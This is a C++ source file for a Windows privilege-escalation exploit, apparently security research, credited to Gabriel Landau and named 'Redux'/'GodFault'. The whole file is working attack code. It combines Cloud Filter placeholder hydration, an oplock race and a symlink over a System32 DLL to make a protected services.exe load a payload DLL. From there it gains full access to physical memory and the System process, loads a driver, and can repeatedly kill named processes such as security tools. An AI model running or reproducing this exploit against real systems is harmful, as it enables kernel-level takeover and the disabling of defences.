// Redux by Gabriel Landau
// https://twitter.com/GabrielLandau

#include <iostream>
#include <phnt_windows.h>
#include <phnt.h>
#include <cfapi.h>
#include <pathcch.h>
#include <Shlwapi.h>
#include <comdef.h>
#include <vector>
#include <conio.h>
#include <TlHelp32.h>
#include <filesystem>

#include "MemoryCommand.h"
#include "Payload.h"
#include "GMShellcode.h"
#include "Logging.h"

#pragma optimize("", off)

CF_CONNECTION_KEY gConnectionKey = { 0, };
WIN32_FILE_ATTRIBUTE_DATA gBenignFileAttributes = { 0, };
HANDLE hBenignFile = NULL;
HANDLE hPayloadFile = NULL;
HANDLE hCurrentFile = NULL;

const wchar_t* gpOplockFile = L"C:\\Windows\\System32\\devobj.dll";
HANDLE hOplockFile = NULL;
HANDLE hOplockEvent = NULL;

#define HIJACK_DLL_PATH L"C:\\Windows\\System32\\EventAggregation.dll"
#define HIJACK_DLL_PATH_BACKUP L"C:\\Windows\\System32\\EventAggregation.dll.bak"
#define PLACEHOLDER_DLL_DIR L"C:\\GodFaultTemp\\"
#define PLACEHOLDER_DLL_BASENAME L"EventAggregationPH.dll"
#define PLACEHOLDER_DLL_PATH PLACEHOLDER_DLL_DIR  PLACEHOLDER_DLL_BASENAME
#define PAYLOAD_DLL_PATH L"C:\\GodFaultTemp\\GodFaultPayload.dll"

std::wstring gKillProcess;
wchar_t* gDriverPath;

bool AcquireOplock()
{
    HANDLE hFile = NULL;
    OVERLAPPED ovl = { NULL, };

    hFile = CreateFileW(
        gpOplockFile, FILE_READ_ATTRIBUTES, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        Log(Error, "CreateFile for oplock failed with GLE %u", GetLastError());
        return false;
    }

    ovl.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ovl))
    {
        Log(Error, "DeviceIoControl for oplock succeeded when it should not have");
        CloseHandle(hFile);
        CloseHandle(ovl.hEvent);
        return false;
    }

    if (ERROR_IO_PENDING != GetLastError())
    {
        Log(Error, "DeviceIoControl for oplock failed with unexpected GLE %u", GetLastError());
        CloseHandle(hFile);
        CloseHandle(ovl.hEvent);
        return false;
    }

    Log(Debug, "Acquired exclusive oplock to file: %ws", gpOplockFile);
    
    hOplockFile = hFile;
    hOplockEvent = ovl.hEvent;

    return true;
}

void ReleaseOplock()
{
    CloseHandle(hOplockFile);
    hOplockFile = NULL;
    CloseHandle(hOplockEvent);
    hOplockEvent = NULL;
}

void WaitForOplockBreak()
{
    WaitForSingleObject(hOplockEvent, 10000);
}

DWORD WINAPI PayloadDeliveryThread(void*)
{
    HRESULT hRet = NULL;
    LARGE_INTEGER fileSize{};
    const wchar_t* pPath = PLACEHOLDER_DLL_PATH;

    WaitForOplockBreak();

    HANDLE hFile = CreateFileW(pPath, DELETE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        Log(Error, "PayloadDeliveryThread: CreateFile failed with GLE %u", GetLastError());
        hRet = HRESULT_FROM_WIN32(GetLastError());
        goto Cleanup;
    }

    GetFileSizeEx(hFile, &fileSize);

    hRet = CfDehydratePlaceholder(hFile, { 0, 0 }, fileSize, CF_DEHYDRATE_FLAG_NONE, 0);
    if (!SUCCEEDED(hRet))
    {
        _com_error err(hRet);
        Log(Error, "CfDehydratePlaceholder failed with HR 0x%08x: %ws", hRet, err.ErrorMessage());
        goto Cleanup;
    }

    hRet = CfHydratePlaceholder(hFile, { 0, 0 }, fileSize, CF_HYDRATE_FLAG_NONE, NULL);
    if (!SUCCEEDED(hRet))
    {
        _com_error err(hRet);
        Log(Error, "CfDehydratePlaceholder failed with HR 0x%08x: %ws", hRet, err.ErrorMessage());
        goto Cleanup;
    }

    Log(Info, "Successfully hydrated file: %ws", pPath);

    // With the payload staged, release the oplock to allow the victim to execute
    ReleaseOplock();

Cleanup:
    CloseHandle(hFile);
    return hRet;
}

VOID CALLBACK FetchDataCallback (
    _In_ CONST CF_CALLBACK_INFO* CallbackInfo,
    _In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
    )
{
    std::string buf;
    DWORD bytesRead = 0;
    NTSTATUS ntStatus = 0;
    HRESULT hRet = S_OK;

    static SRWLOCK sFetchDataCallback = SRWLOCK_INIT;
    const LONGLONG readLength = CallbackParameters->FetchData.RequiredLength.QuadPart;

    Log(Debug, "FetchDataCallback called.");

    AcquireSRWLockExclusive(&sFetchDataCallback);

    buf.resize(readLength);
    if (!SetFilePointerEx(hCurrentFile, CallbackParameters->FetchData.RequiredFileOffset, NULL, FILE_BEGIN))
    {
        ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
        Log(Error, "SetFilePointerEx failed with GLE %u", GetLastError());
    }

    if (!ReadFile(hCurrentFile, &buf[0], (DWORD)buf.size(), &bytesRead, NULL))
    {
        ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
        Log(Error, "ReadFile failed with GLE %u", GetLastError());
    }

    CF_OPERATION_INFO opInfo = { 0, };
    CF_OPERATION_PARAMETERS opParams = { 0, };

    opInfo.StructSize = sizeof(opInfo);
    opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
    opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
    opInfo.TransferKey = CallbackInfo->TransferKey;

    opParams.ParamSize = sizeof(opParams);
    opParams.TransferData.CompletionStatus = ntStatus;
    opParams.TransferData.Buffer = &buf[0];
    opParams.TransferData.Offset = CallbackParameters->FetchData.RequiredFileOffset;
    opParams.TransferData.Length.QuadPart = bytesRead;
    
    Log(Debug, "Hydrating %llu bytes at offset %llu", 
        opParams.TransferData.Length.QuadPart,
        opParams.TransferData.Offset.QuadPart);

    hRet = CfExecute(&opInfo, &opParams);
    if (!SUCCEEDED(hRet))
    {
        Log(Error, "CfExecute failed with HR 0x%08x GLE %u", hRet, GetLastError());
    }

    // Once the benign file has been fully read once, switch over to the payload
    if ((hCurrentFile == hBenignFile) &&
        ((CallbackParameters->FetchData.RequiredFileOffset.QuadPart + readLength) >=
            gBenignFileAttributes.nFileSizeLow))

    {
        Log(Debug, "Switching to payload");
        hCurrentFile = hPayloadFile;

        Log(Debug, "Give the memory manager a moment to think");
        Sleep(100);

        Log(Debug, "Emptying system working set");
        EmptySystemWorkingSet();

        CloseHandle(CreateThread(NULL, 0, PayloadDeliveryThread, NULL, 0, NULL));
        Sleep(500);
    }

    ReleaseSRWLockExclusive(&sFetchDataCallback);
}

bool MoveFileWithPrivilege(const std::wstring& src, const std::wstring& dest)
{
    bool bResult = false;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BOOLEAN ignored = 0;
    NTSTATUS ntStatus = 0;
    std::string buf;
    PFILE_RENAME_INFO pRenameInfo = NULL;
    const std::wstring ntDest = L"\\??\\" + dest;

    ntStatus = RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &ignored);
    if (0 != ntStatus)
    {
        Log(Error, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
        goto Cleanup;
    }

    ntStatus = RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &ignored);
    if (0 != ntStatus)
    {
        Log(Error, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
        goto Cleanup;
    }

    hFile = CreateFileW(
        src.c_str(), 
        SYNCHRONIZE | DELETE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, 
        NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        Log(Error, "MoveFileWithPrivilege: CreateFile failed with GLE %u", GetLastError());
        goto Cleanup;
    }

    buf.resize(sizeof(FILE_RENAME_INFO) + (ntDest.size() * sizeof(wchar_t)));
    pRenameInfo = (PFILE_RENAME_INFO)&buf[0];
    pRenameInfo->FileNameLength = (DWORD)(ntDest.size() * sizeof(wchar_t));
    memcpy(pRenameInfo->FileName, &ntDest[0], pRenameInfo->FileNameLength);

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)buf.size()))
    {
        Log(Error, "MoveFileWithPrivilege: SetFileInformationByHandle failed with GLE %u", GetLastError());
        goto Cleanup;
    }

    bResult = true;

Cleanup:
    if (INVALID_HANDLE_VALUE != hFile)
    {
        CloseHandle(hFile);
    }

    return bResult;
}

bool FileExists(const std::wstring& path)
{
    return (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(path.c_str()));
}

bool InstallSymlink()
{
    // Make sure PLACEHOLDER exists
    if (!FileExists(PLACEHOLDER_DLL_PATH))
    {
        Log(Error, "InstallSymlink: Placeholder does not exist.  Refusing to install symlink.  GLE: %u", GetLastError());
        return false;
    }
    
    // Move HIJACK => BACKUP
    if (!MoveFileWithPrivilege(HIJACK_DLL_PATH, HIJACK_DLL_PATH_BACKUP))
    {
        Log(Error, "InstallSymlink: MoveFileExW failed with GLE: %u", GetLastError());
        return false;
    }
    
    if (!CreateSymbolicLinkW(HIJACK_DLL_PATH, PLACEHOLDER_DLL_PATH, 0))
    {
        Log(Error, "InstallSymlink: CreateSymbolicLinkW failed with GLE: %u", GetLastError());
        return false;
    }

    return true;
}

bool CleanupSymlink()
{
    // Delete PLACEHOLDER
    (void)DeleteFile(PLACEHOLDER_DLL_PATH);

    // Make sure BACKUP exists before attempting to restore
    if (!FileExists(HIJACK_DLL_PATH_BACKUP))
    {
        Log(Debug, "No cleanup necessary.  Backup does not exist.");
        return false;
    }

    // Delete symlink
    (void)DeleteFile(HIJACK_DLL_PATH);

    // Restore BACKUP => HIJACK
    if (!MoveFileWithPrivilege(HIJACK_DLL_PATH_BACKUP, HIJACK_DLL_PATH))
    {
        Log(Error, "InstallSymlink: MoveFileExW failed with GLE: %u", GetLastError());
        return false;
    }
    
    return true;
}

bool SpawnPPL()
{
    std::wstring childPath = L"C:\\Windows\\System32\\services.exe";
    STARTUPINFOW si = { 0, };
    PROCESS_INFORMATION pi = { 0, };
    DWORD dwResult = 0;

    si.cb = sizeof(si);

    if (!CreateProcessW(childPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_PROTECTED_PROCESS, NULL, NULL, &si, &pi))
    {
        Log(Error, "SpawnPPL: CreateProcessW failed with GLE: %u", GetLastError());
        return false;
    }

    Log(Info, "SpawnPPL: Waiting for child process to finish.");
    
    dwResult = WaitForSingleObject(pi.hProcess, 60 * 1000);
    if (WAIT_OBJECT_0 != dwResult)
    {
        Log(Error, "SpawnPPL: WaitForSingleObject returned %u.  Expected WAIT_OBJECT_0.  GLE: %u", dwResult, GetLastError());
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

const char * TestExploit()
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
    if (hProcess)
    {
        CloseHandle(hProcess);
        return "Success";
    }
    else
    {
        return "Failure";
    }
}

bool KillAllProcessesWithName(const std::wstring& procName)
{
    bool bSuccess = false;
    HANDLE hProcessSnapshot = NULL;
    PROCESSENTRY32 processEntry = { 0, };
    HANDLE hProcess = NULL;

    // Retrieve a process snapshot
    hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (InvalidHandle(hProcessSnapshot))
    {
        goto Cleanup;
    }

    // Retrieve the first process
    processEntry.dwSize = sizeof(processEntry);
    if (!Process32FirstW(hProcessSnapshot, &processEntry))
    {
        goto Cleanup;
    }

    do
    {
        if (!StrStrIW(processEntry.szExeFile, procName.c_str()))
        {
            continue;
        }

        if (hProcess)
        {
            CloseHandle(hProcess);
        }

        hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
        if (!hProcess)
        {
            Log(Error, "Failed to open process with GLE %u: %ws", GetLastError(), processEntry.szExeFile);
            continue;
        }

        NTSTATUS ntStatus = NtTerminateProcess(hProcess, STATUS_VIRUS_INFECTED);
        if (STATUS_PROCESS_IS_TERMINATING == ntStatus)
        {
            continue;
        }
        else if (!NT_SUCCESS(ntStatus))
        {
            Log(Error, "Failed to terminate process with NTSTATUS %08x: %ws", ntStatus, processEntry.szExeFile);
            continue;
        }

        Log(Info, "GodFault killed process %u: %ws", processEntry.th32ProcessID, processEntry.szExeFile);

        bSuccess = true;

    } while (Process32NextW(hProcessSnapshot, &processEntry));

Cleanup:
    if (ValidHandle(hProcessSnapshot))
    {
        CloseHandle(hProcessSnapshot);
    }

    if (hProcess)
    {
        CloseHandle(hProcess);
    }

    return bSuccess;
}

HANDLE OpenPhysicalMemoryDevice()
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    HANDLE hSection = NULL;
    UNICODE_STRING name;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK iosb = { 0, };
    HANDLE hSystemProcess = NULL;

    // Open \Device\PhysicalMemory for full access (SECTION_ALL_ACCESS)
    {
        RtlInitUnicodeString(&name, L"\\Device\\PhysicalMemory");
        InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

        ntStatus = NtOpenSection(&hSection, SECTION_ALL_ACCESS, &objAttr);
        if (!NT_SUCCESS(ntStatus))
        {
            Log(Error, "Failed to open %wZ with NTSTATUS 0x%08x", &name, ntStatus);
            goto Cleanup;
        }

        Log(Info, "Opened %wZ.  Handle is 0x%x", &name, hSection);
    }
    
    // Open the System process (PID 4) for full access (PROCESS_ALL_ACCESS)
    {
        hSystemProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
        if (NULL == hSystemProcess)
        {
            Log(Error, "Failed to open PROCESS_ALL_ACCESS to System process with GLE 0x%08x", GetLastError());
            goto Cleanup;
        }
        Log(Info, "Opened System process as PROCESS_ALL_ACCESS.  Handle is 0x%x", HandleToULong(hSystemProcess));
    }

    if (!gKillProcess.empty())
    {
        while (true)
        {
            KillAllProcessesWithName(gKillProcess);
            Sleep(1);
        }
    }

    //__debugbreak();
    Log(Info, "Press any key to continue...");
    _getch();

Cleanup:
    return hSection;
}

bool EnablePrivs()
{
    bool bResult = false;
    NTSTATUS ntStatus = STATUS_SUCCESS;
    BOOLEAN ignored = FALSE;

    const std::vector<DWORD> privs = {
        SE_DEBUG_PRIVILEGE,
        SE_IMPERSONATE_PRIVILEGE,
        SE_BACKUP_PRIVILEGE,
        SE_RESTORE_PRIVILEGE,
        SE_LOAD_DRIVER_PRIVILEGE,
    };

    for (const auto& priv : privs)
    {
        ntStatus = RtlAdjustPrivilege(priv, TRUE, FALSE, &ignored);
        if (!NT_SUCCESS(ntStatus))
        {
            Log(Error, "Failed to enabled required privilege: %u with NTSTATUS 0x%08x", priv, ntStatus);
            return false;
        }
    }
    
    return true;
}

extern void PrepDriverLoad(LPCWSTR DriverName);
extern void DoDriverLoad();

int wmain(int argc, wchar_t* argv[])
{
    int result = 1;
    DWORD bytesWritten = 0;
    DWORD ignored = 0;
    HRESULT hRet = S_OK;
    CF_CONNECTION_KEY key = { 0 };
    std::string payloadBuf;
    ULONGLONG startTime = GetTickCount64();
    ULONGLONG endTime = 0;
    DWORD elevateThreadId = GetCurrentThreadId();
   
    if (NtCurrentPeb()->OSBuildNumber < 14393)
    {
        Log(Error, "This tool requires Windows 10");
        return 1;
    }

    if (IsFixedVersion())
    {
        Log(Error, "Redux was fixed in 24H2!");
        return 1;
    }

    if (!EnablePrivs())
    {
        return 1;
    }

    if (argc >= 2 && (0 == _wcsicmp(L"-v", argv[1])))
    {
        SetLogLevel(LogLevel::Debug);

        argc--;
        argv++;
    }

    if (argc > 1)
    {
        argc--;
        gDriverPath = argv[1];
    }

    // Clean up from any previous failed runs
    (void)CleanupSymlink();
    (void)CreateDirectoryW(PLACEHOLDER_DLL_DIR, NULL);

    hBenignFile = CreateFileW(HIJACK_DLL_PATH, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hBenignFile)
    {
        Log(Error, "Failed to open file with GLE %u: %ws", GetLastError(), HIJACK_DLL_PATH);
        return 1;
    }

    hPayloadFile = CreateFileW(PAYLOAD_DLL_PATH, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (INVALID_HANDLE_VALUE == hPayloadFile)
    {
        Log(Error, "Failed to open file with GLE %u: %ws", GetLastError(), PAYLOAD_DLL_PATH);
        return 1;
    }

    hCurrentFile = hBenignFile;

    if (!BuildPayload(hBenignFile, payloadBuf, elevateThreadId))
    {
        Log(Error, "Failed to build payload");
        return 1;
    }

    if (!WriteFile(hPayloadFile, payloadBuf.data(), (DWORD)payloadBuf.size(), &bytesWritten, NULL) ||
        (bytesWritten != payloadBuf.size()))
    {
        Log(Error, "Failed to write payload file with GLE %u: %ws", GetLastError(), PAYLOAD_DLL_PATH);
        return 1;
    }

    // CloudFilter APIs based on https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html
    CF_SYNC_REGISTRATION syncReg = { 0 };
    syncReg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    syncReg.ProviderName = L"CT";
    syncReg.ProviderVersion = L"1.0";
    // {119C6523-407B-446B-B0E3-E03011178F50}
    syncReg.ProviderId = { 0x119c6523, 0x407b, 0x446b, { 0xb0, 0xe3, 0xe0, 0x30, 0x11, 0x17, 0x8f, 0x50 } };

    CF_SYNC_POLICIES policies = { 0 };
    policies.StructSize = sizeof(CF_SYNC_POLICIES);
    policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    policies.InSync = CF_INSYNC_POLICY_NONE;
    policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

    hRet = CfRegisterSyncRoot(PLACEHOLDER_DLL_DIR, &syncReg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (!SUCCEEDED(hRet))
    {
        Log(Error, "CfRegisterSyncRoot failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    CF_CALLBACK_REGISTRATION cbReg[2] = {};
    cbReg[0].Callback = FetchDataCallback;
    cbReg[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
    cbReg[1].Type = CF_CALLBACK_TYPE_NONE;

    hRet = CfConnectSyncRoot(PLACEHOLDER_DLL_DIR, cbReg, NULL, CF_CONNECT_FLAG_NONE, &gConnectionKey);
    if (!SUCCEEDED(hRet))
    {
        CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
        Log(Error, "CfConnectSyncRoot failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    GetFileAttributesExW(HIJACK_DLL_PATH, GetFileExInfoStandard, &gBenignFileAttributes);

    CF_PLACEHOLDER_CREATE_INFO phInfo = { 0, };

    phInfo.FsMetadata.FileSize.HighPart = gBenignFileAttributes.nFileSizeHigh;
    phInfo.FsMetadata.FileSize.LowPart = gBenignFileAttributes.nFileSizeLow;
    phInfo.FsMetadata.BasicInfo.FileAttributes = gBenignFileAttributes.dwFileAttributes;
    // Always use now instead?
    phInfo.FsMetadata.BasicInfo.CreationTime.LowPart = gBenignFileAttributes.ftCreationTime.dwLowDateTime;
    phInfo.FsMetadata.BasicInfo.CreationTime.HighPart = gBenignFileAttributes.ftCreationTime.dwHighDateTime;

    phInfo.RelativeFileName = PLACEHOLDER_DLL_BASENAME;
    phInfo.Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    phInfo.FileIdentityLength = 0x130;
    phInfo.FileIdentity = malloc(phInfo.FileIdentityLength);

    DWORD processed = 0;
    hRet = CfCreatePlaceholders(PLACEHOLDER_DLL_DIR, &phInfo, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processed);
    if (!SUCCEEDED(hRet) || (1 != processed))
    {
        CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
        Log(Error, "CfCreatePlaceholders failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    if (!InstallSymlink())
    {
        Log(Error, "InstallSymlink failed.  Aborting.");
        return 1;
    }

    Log(Debug, "Benign: %ws", HIJACK_DLL_PATH_BACKUP);
    Log(Debug, "Payload: %ws", PAYLOAD_DLL_PATH);
    Log(Debug, "Placeholder: %ws", PLACEHOLDER_DLL_PATH);

    if (!AcquireOplock())
    {
        goto Cleanup;
    }

	PrepDriverLoad(gDriverPath);

    Log(Info, "Ready.  Spawning WinTcb.");
    if (!SpawnPPL())
    {
        goto Cleanup;
    }
    // Clean up now because it can be hard/impossible to kill this process later
    CleanupSymlink();

    if (GetCurrentThreadId() == elevateThreadId)
    {
		DoDriverLoad();
    }

    result = 0;

Cleanup:
    ReleaseOplock();
    Sleep(100);
    CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
    CleanupSymlink();
    
    return result;
}

